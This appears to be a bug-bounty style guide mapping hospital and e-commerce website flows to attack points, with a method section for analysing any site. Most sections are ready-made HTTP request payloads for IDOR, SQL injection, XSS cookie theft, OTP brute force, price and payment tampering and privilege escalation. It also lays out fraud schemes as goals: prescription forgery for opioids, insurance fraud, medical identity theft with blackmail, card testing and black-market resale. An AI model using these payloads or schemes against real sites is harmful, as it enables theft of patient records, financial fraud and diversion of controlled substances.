# 🏥 **HOSPITAL WEBSITE FLOW ANALYSIS & ATTACK MAP**

## **1. UNDERSTAND THE HOSPITAL SYSTEM**

### **Stakeholders & Their Goals:**
- **Patients:** Book appointments, view reports, pay bills, consult doctors
- **Doctors:** View schedules, access patient records, prescribe medication
- **Administrators:** Manage users, view analytics, handle billing
- **Labs/Pharmacy:** Receive orders, update status, manage inventory

### **Critical Assets (What's Valuable):**
```
💰 Money: Bill payments, insurance claims, pharmacy payments
📊 Data: Patient medical records, prescriptions, lab reports
🔐 Control: Doctor accounts, admin panels, appointment systems
```

---

## **2. PATIENT FLOW MAPPING & ATTACK POINTS**

### **FLOW 1: Patient Registration & Login**
```
Step 1: Visit hospital website → Click "Register"
Step 2: Fill form (Name, Email, Phone, DOB, Medical History)
Step 3: Verify email/phone via OTP
Step 4: Set password → Login
Step 5: Redirect to patient dashboard
```

**🔴 ATTACK POINTS:**
```http
# 1. Registration Bypass
POST /register
{
  "email": "victim@gmail.com",
  "phone": "9999999999",
  "otp": "000000"  # Try default/weak OTP
}

# 2. Email/Phone Enumeration
POST /check-email
{"email": "admin@hospital.com"} → Different response?

# 3. Weak OTP Logic
- Reuse OTP from previous session
- Brute force 6-digit OTP (if no rate limit)
- OTP sent in response body

# 4. Password Reset Hijacking
POST /reset-password
{
  "email": "victim@gmail.com",
  "new_password": "hacker123",
  "token": "predictable_token"
}
```

### **FLOW 2: Book Appointment**
```
Step 1: Select department/specialization
Step 2: Choose doctor → View available slots
Step 3: Select date/time → Fill symptoms
Step 4: Choose payment mode (Pay now/At hospital)
Step 5: Confirm → Get appointment ID
```

**🔴 ATTACK POINTS:**
```http
# 1. Doctor Schedule Manipulation
POST /book-appointment
{
  "doctor_id": "101",
  "date": "2024-12-25",
  "time_slot": "10:00",
  "patient_id": "current_user_id"  # Change to other patient ID
}

# 2. Overbooking/Denial of Service
- Book all slots for a doctor
- Cancel and immediately rebook
- Book fake appointments

# 3. Price Tampering (if paid online)
POST /confirm-appointment
{
  "appointment_id": "123",
  "consultation_fee": "0",  # Change from 500 to 0
  "payment_status": "paid"
}

# 4. Appointment Details Leakage
GET /appointment/12345
# Change appointment ID to access others' appointments
```

### **FLOW 3: Access Medical Records**
```
Step 1: Navigate to "Medical Records"
Step 2: View list of past consultations
Step 3: Click on specific record
Step 4: View doctor notes, prescriptions, lab reports
Step 5: Download/Share records
```

**🔴 ATTACK POINTS:**
```http
# 1. IDOR - Access Others' Records
GET /api/medical-records?patient_id=1001
# Change patient_id to 1002, 1003, etc.

# 2. Direct File Access
GET /uploads/reports/patient_1001_lab.pdf
# Try patient_1002_lab.pdf, patient_1003_lab.pdf

# 3. Search Parameter Manipulation
GET /records/search?query=HIV
# Try: query=*, query=all, query=' OR 1=1 --

# 4. Export Functionality Abuse
POST /export-records
{
  "format": "csv",
  "patient_ids": ["1001", "1002", "1003"]  # Add more IDs
}
```

### **FLOW 4: Lab Test Results**
```
Step 1: Doctor prescribes tests
Step 2: Patient pays for tests
Step 3: Sample collected
Step 4: Lab uploads results
Step 5: Patient views results
```

**🔴 ATTACK POINTS:**
```http
# 1. Lab Result Upload Manipulation
POST /lab/upload-result
{
  "test_id": "LAB5001",
  "result_url": "https://malicious.com/fake_report.pdf",
  "status": "normal"  # Change critical results to normal
}

# 2. Early Result Access
GET /lab/results?test_id=LAB5001
# Access before official release

# 3. Result Deletion/Modification
DELETE /lab/results/LAB5001
POST /lab/update-result
{
  "test_id": "LAB5001", 
  "new_result": "All tests normal"
}
```

### **FLOW 5: Pharmacy & Prescriptions**
```
Step 1: Doctor writes prescription
Step 2: Prescription appears in patient account
Step 3: Patient orders medicines online
Step 4: Pay → Medicine delivered
```

**🔴 ATTACK POINTS:**
```http
# 1. Prescription Forgery
POST /pharmacy/new-prescription
{
  "patient_id": "1001",
  "doctor_id": "101",  # Use real doctor's ID
  "medicines": ["Morphine", "Oxycodone"],
  "signature": "stolen_digital_signature"
}

# 2. Medicine Price Manipulation
POST /cart/checkout
{
  "items": [
    {"medicine_id": "MED123", "price": "0.01"}  # Original: $50
  ],
  "total": "0.01"
}

# 3. Unlimited Quantity Order
POST /cart/add
{
  "medicine_id": "CONTROLLED_MED123",
  "quantity": "9999"  # Controlled substance
}
```

### **FLOW 6: Billing & Insurance**
```
Step 1: Hospital generates bill
Step 2: Patient views bill online
Step 3: Apply insurance claim
Step 4: Pay remaining amount
Step 5: Download receipt
```

**🔴 ATTACK POINTS:**
```http
# 1. Bill Amount Manipulation
POST /billing/update
{
  "bill_id": "BILL2024001",
  "total_amount": "100",  # Change from $5000 to $100
  "insurance_covered": "4900"
}

# 2. Insurance Fraud
POST /insurance/claim
{
  "bill_id": "BILL2024001",
  "patient_id": "1001",
  "insurance_id": "fake_policy_number",
  "amount": "5000"
}

# 3. Receipt Forgery
GET /receipt/generate?bill_id=BILL2024001&format=pdf
# Modify bill details in request
```

---

## **3. DOCTOR FLOW (HIGH VALUE TARGET)**

### **Doctor Dashboard Access:**
```
Step 1: Doctor login (special credentials)
Step 2: View appointment schedule
Step 3: Access patient records
Step 4: Write prescriptions
Step 5: Update medical notes
```

**🔴 ATTACK POINTS:**
```http
# 1. Doctor Account Takeover
POST /doctor/login
{
  "username": "dr.smith",
  "password": "' OR '1'='1"  # SQL Injection
}

# 2. Elevate from Patient to Doctor
POST /api/update-profile
{
  "user_type": "doctor",
  "specialization": "cardiology",
  "license_number": "stolen_license"
}

# 3. Access All Patient Data
GET /doctor/patients?filter=all
# Bypass filters to get complete database

# 4. Prescription Authority Abuse
POST /prescribe
{
  "patient_id": "ANY_PATIENT",
  "medicine": "CONTROLLED_SUBSTANCE",
  "dosage": "dangerous_amount",
  "refills": "999"
}
```

---

## **4. ADMIN FLOW (ULTIMATE TARGET)**

### **Admin Panel Access:**
```
Step 1: Admin login (/admin)
Step 2: Manage users (patients, doctors, staff)
Step 3: View financial reports
Step 4: System configuration
Step 5: Database backups
```

**🔴 ATTACK POINTS:**
```http
# 1. Direct Admin Access
/admin
/admin.php
/administrator
/panel
/backend

# 2. Parameter Tampering to Gain Admin
POST /login
{
  "email": "patient@gmail.com",
  "password": "patient123",
  "is_admin": "true"
}

# 3. User Management Abuse
POST /admin/create-user
{
  "email": "hacker@evil.com",
  "role": "superadmin",
  "permissions": "all"
}

# 4. Financial Data Access
GET /admin/reports/financial?year=2024
# Download all billing data

# 5. Database Dump
GET /admin/backup?type=sql
GET /admin/export?table=patients
```

---

## **5. BUSINESS LOGIC ATTACKS (HOSPITAL SPECIFIC)**

### **Attack 1: Appointment Scalping**
```python
# Bot to book all premium doctor slots
while True:
    book_appointment(premium_doctor, prime_time)
    # Resell appointments offline
```

### **Attack 2: Insurance Claim Fraud**
```
1. Create fake patient accounts
2. Generate fake medical bills
3. Submit insurance claims
4. Collect payout
```

### **Attack 3: Medical Identity Theft**
```
1. Steal patient credentials
2. Access medical history
3. Use for:
   - Fake insurance claims
   - Purchase controlled medicines
   - Blackmail with sensitive conditions
```

### **Attack 4: Medicine Reselling**
```
1. Order prescription medicines at low cost
2. Change delivery address to drop location
3. Resell on black market at high profit
```

---

# 🛍️ **SHOPPING WEBSITE FLOW ANALYSIS & ATTACK MAP**

## **1. UNDERSTAND THE E-COMMERCE SYSTEM**

### **Core Business Flows:**
1. **Product Discovery** → **Add to Cart** → **Checkout** → **Payment** → **Fulfillment**
2. **User Account** → **Order History** → **Reviews** → **Refunds**
3. **Admin** → **Inventory** → **Orders** → **Customers** → **Analytics**

### **What's Valuable:**
```
💰 Money: Payment bypass, coupon abuse, price manipulation
📦 Goods: Free products, inventory manipulation
📊 Data: Customer info, payment details, business metrics
```

---

## **2. CUSTOMER FLOW ATTACK ANALYSIS**

### **FLOW 1: Product Browsing & Selection**
```
Step 1: Browse categories/search products
Step 2: View product details (price, stock, variants)
Step 3: Select options (size, color, quantity)
Step 4: Add to cart/wishlist
```

**🔴 ATTACK POINTS:**
```http
# 1. Hidden Products Access
GET /api/products?status=hidden
GET /api/products?category=upcoming
GET /api/products?admin_view=true

# 2. Price Exposure in APIs
GET /api/product/123
Response: {"cost_price": 10, "selling_price": 50}
# Now you know profit margin

# 3. Stock Manipulation
POST /api/cart/add
{
  "product_id": "123",
  "quantity": "999999"  # Cause stock issues
}

# 4. Product Variant Tampering
POST /api/cart/add
{
  "product_id": "123",
  "variant_id": "premium",  # But pay basic price
  "price": "basic_price"
}
```

### **FLOW 2: Shopping Cart Management**
```
Step 1: View cart items
Step 2: Update quantities
Step 3: Apply coupons
Step 4: Calculate totals
Step 5: Proceed to checkout
```

**🔴 ATTACK POINTS:**
```http
# 1. Price Manipulation in Cart
POST /api/cart/update
{
  "items": [
    {"id": "item_1", "price": "0.01"}  # Original: $100
  ]
}

# 2. Negative Pricing
POST /api/cart/add
{
  "product_id": "123",
  "quantity": "-10",  # Get money added to account?
  "price": "-100"
}

# 3. Coupon Stacking Abuse
POST /api/cart/apply-coupon
{
  "coupons": ["SAVE10", "SAVE20", "SAVE30", "FREESHIP"]
}
# Apply multiple when should be one

# 4. Hidden Cart Parameters
POST /api/cart/checkout
{
  "total": "1.00",
  "discount": "99%",
  "tax_exempt": "true",
  "free_shipping": "true"
}
```

### **FLOW 3: Checkout Process**
```
Step 1: Enter shipping address
Step 2: Choose shipping method
Step 3: Enter payment details
Step 4: Review order
Step 5: Place order
```

**🔴 ATTACK POINTS:**
```http
# 1. Shipping Address Bypass
POST /checkout/shipping
{
  "address": "free_shipping_zone",  # Even if not in zone
  "shipping_cost": "0"
}

# 2. Payment Method Tampering
POST /checkout/payment
{
  "method": "cash_on_delivery",
  "discount": "100%",  # Add unauthorized discount
  "final_amount": "0"
}

# 3. Order Review Manipulation
GET /checkout/review?order_id=123
# Change order_id to see other customers' orders

# 4. Checkout Step Skipping
Direct access:
GET /checkout/confirm  # Skip payment
POST /checkout/complete  # Skip all steps
```

### **FLOW 4: Payment Processing**
```
Step 1: Select payment method (CC, PayPal, COD)
Step 2: Enter payment details
Step 3: Process payment
Step 4: Verify success
Step 5: Create order
```

**🔴 ATTACK POINTS:**
```http
# 1. Payment Amount Override
POST /payment/process
{
  "amount": "1.00",  # Original: $500
  "currency": "USD",
  "order_id": "ORDER123"
}

# 2. Payment Status Manipulation
GET /payment/callback?order_id=123&status=success
# Fake payment callback

# 3. Card Testing
POST /payment/process
{
  "card_number": "4111111111111111",
  "expiry": "12/30",
  "cvv": "123"
}
# Test multiple cards for validity

# 4. Payment Replay Attack
# Capture successful payment request
# Replay multiple times for multiple orders
```

### **FLOW 5: Order Management**
```
Step 1: View order confirmation
Step 2: Track shipment
Step 3: Receive order
Step 4: Return/refund if needed
Step 5: Write review
```

**🔴 ATTACK POINTS:**
```http
# 1. Order Cancellation Abuse
POST /orders/cancel
{
  "order_id": "OTHER_USER_ORDER",
  "refund_to": "attacker_account"
}

# 2. Return/Refund Fraud
POST /returns/create
{
  "order_id": "ORDER123",
  "reason": "damaged",
  "refund_amount": "500",  # More than paid
  "keep_product": "true"  # Request refund but keep item
}

# 3. Shipment Address Change After Shipping
POST /orders/update-address
{
  "order_id": "ORDER123",
  "new_address": "attacker_address"
}
# Redirect others' orders to yourself

# 4. Review System Abuse
POST /reviews/create
{
  "product_id": "123",
  "rating": "5",
  "content": "<script>stealCookies()</script>",
  "verified_purchase": "true"  # When not purchased
}
```

### **FLOW 6: User Account Management**
```
Step 1: Registration
Step 2: Login
Step 3: Profile update
Step 4: Address book
Step 5: Payment methods
Step 6: Order history
```

**🔴 ATTACK POINTS:**
```http
# 1. Account Takeover via Profile Update
POST /account/update
{
  "email": "victim@email.com",  # Change to attacker email
  "phone": "attacker_phone"
}

# 2. Payment Method Hijacking
POST /account/add-card
{
  "user_id": "OTHER_USER_ID",  # Add card to other's account
  "card_number": "attacker_card",
  "make_default": "true"
}

# 3. Loyalty Points Manipulation
POST /account/add-points
{
  "user_id": "ATTACKER_ID",
  "points": "999999",
  "reason": "promotion"  # Fake reason
}

# 4. Gift Card Balance Tampering
POST /giftcard/redeem
{
  "code": "GUESSABLE_CODE",
  "amount": "1000"  # Set arbitrary amount
}
```

---

## **3. ADMIN/SHOP MANAGER FLOW ATTACKS**

### **FLOW: Inventory Management**
```
Step 1: Add new products
Step 2: Update prices
Step 3: Manage stock
Step 4: Process orders
Step 5: View analytics
```

**🔴 ATTACK POINTS:**
```http
# 1. Price Manipulation at Scale
POST /admin/products/update-prices
{
  "discount": "99%",
  "apply_to": "all_products"
}
# Apply massive discount, then buy everything

# 2. Fake Product Creation
POST /admin/products/create
{
  "name": "Premium Product",
  "price": "0.01",
  "stock": "1000"
}
# Create cheap product, buy, resell

# 3. Order Status Manipulation
POST /admin/orders/update
{
  "order_id": "ATTACKER_ORDER",
  "status": "shipped",
  "tracking_number": "fake_number"
}
# Mark unpaid orders as shipped

# 4. Customer Data Export
GET /admin/customers/export?format=csv
# Download entire customer database
```

### **FLOW: Discount/Coupon Management**
```
Step 1: Create coupon codes
Step 2: Set rules (min order, categories)
Step 3: Set limits (usage count)
Step 4: Monitor usage
```

**🔴 ATTACK POINTS:**
```http
# 1. Unlimited Coupon Generation
POST /admin/coupons/create
{
  "code": "FREEEVERYTHING",
  "discount": "100%",
  "usage_limit": "999999",
  "expiry": "2099-12-31"
}

# 2. Coupon Rule Bypass
POST /admin/coupons/create
{
  "code": "BYPASS",
  "min_order": "0.01",  # Very low minimum
  "categories": ["all"],
  "single_use": "false"
}

# 3. View All Active Coupons
GET /api/coupons?active=true
GET /admin/coupons/list  # Direct access attempt
```

---

## **4. BUSINESS LOGIC ATTACKS (SHOPPING SPECIFIC)**

### **Attack 1: Cart/Checkout Race Condition**
```python
# Scenario: Limited stock item
Thread 1: Add to cart → Reserve stock
Thread 2: Add same item → Also gets reserved
Thread 3: Checkout both → Oversell beyond actual stock
```

### **Attack 2: Negative Loyalty Points**
```
1. Accumulate loyalty points
2. Apply points for discount
3. Return items but keep points
4. Repeat → Infinite money loop
```

### **Attack 3: Price Discrepancy Attack**
```
1. Add item to cart at price $100
2. Price changes to $150 on website
3. Cart still shows $100 (if not updated)
4. Complete purchase at old price
```

### **Attack 4: Discount Stacking Exploit**
```
Base Price: $100
Coupon 1: 50% off → $50
Coupon 2: $30 off → $20
Coupon 3: Free shipping → $20
Reward Points: 1000 points = $10 → $10
Final: Pay $10 for $100 item
```

### **Attack 5: Return Shipping Fraud**
```
1. Order heavy/bulky item
2. Claim return for refund
3. Get return shipping label (prepaid)
4. Send empty box or wrong item
5. Get full refund + keep item
```

---

## **5. ADVANCED CHAINING ATTACKS**

### **Hospital + Shopping Combo Attack:**
```
1. Steal patient data from hospital (IDOR)
2. Use patient info to create verified shopping accounts
3. Make purchases using patient payment methods
4. Ship to drop locations
5. Resell goods for cash
```

### **Complete Takeover Scenario:**
```
1. Find IDOR in hospital → Access admin records
2. Get doctor credentials from admin panel
3. Use doctor account to prescribe controlled medicines
4. Order medicines to drop address
5. Sell on black market
```

---

# 🎯 **HOW TO ANALYZE ANY WEBSITE FLOW**

## **STEP-BY-STEP FLOW ANALYSIS METHOD:**

### **1. Manual Exploration (30 minutes)**
```
✅ Register new account
✅ Complete every user action possible
✅ Take screenshots of each step
✅ Note all API calls (Burp Proxy)
✅ Map user journey from start to finish
```

### **2. Identify Value Points**
```
💰 Where does money change hands?
🔐 Where are authentication checks?
📊 Where is sensitive data displayed?
⚙️ Where can configuration be changed?
```

### **3. Create Attack Matrix**
For each step, ask:
```
1. Can I skip this step?
2. Can I repeat this step?
3. Can I do it out of order?
4. Can I access others' data here?
5. Can I manipulate prices/values?
6. Is there rate limiting?
7. Are tokens predictable?
8. Can I escalate privileges?
```

### **4. Business Logic Mapping**
```
Input: What data goes IN at each step?
Processing: What happens to that data?
Output: What comes OUT?
Storage: Where is it saved?
Access: Who can access it later?
```

### **5. Data Flow Diagram Creation**
```
User → Frontend → API → Database
       ↓        ↓       ↓
    Browser  Server  Storage
       ↓        ↓       ↓
    Cookies  Sessions  Files
```

---

## **🔧 TOOLS FOR FLOW ANALYSIS:**

### **Manual Mapping:**
- **Burp Suite:** Proxy + Repeater for each step
- **Browser DevTools:** Network tab monitoring
- **Draw.io/Lucidchart:** Visual flow mapping
- **Notepad:** Step-by-step logging

### **Automated Helpers:**
- **Burp's Flow extension:** Auto-sequence requests
- **Autorize:** Test authorization at each step
- **Param Miner:** Find hidden parameters

---

## **📝 FLOW ANALYSIS TEMPLATE:**

```markdown
# Website: [Name]
# Flow: [Registration/Checkout/etc.]

## Steps:
1. [Step 1 description]
   - URL: 
   - Method: 
   - Parameters: 
   - Response: 

2. [Step 2 description]
   - URL: 
   - Method: 
   - Parameters: 
   - Response: 

## Attack Vectors:
- [ ] IDOR potential: 
- [ ] Price manipulation: 
- [ ] Auth bypass: 
- [ ] Logic flaw: 
- [ ] Data exposure: 

## Test Cases:
1. [Test case 1]
2. [Test case 2]
3. [Test case 3]
```

---

## **🎯 GOLDEN RULES FOR FLOW BREAKING:**

1. **Follow the Money:** Always check payment flows first
2. **Trust Boundaries:** Where does trust change? Attack there
3. **State Transitions:** Can you change state illegally?
4. **Assumptions:** What assumptions did developers make? Break them
5. **Error Handling:** What happens on errors? Often reveals data

---

**Remember:** Every flow is a story. Your job is to find plot holes in that story where you can insert yourself as the villain who gets rich. 

Start with one flow, master it, then move to the next. Depth over breadth. One critical find in payment flow is worth 100 low-severity issues.

**Happy flow breaking! 🚀**
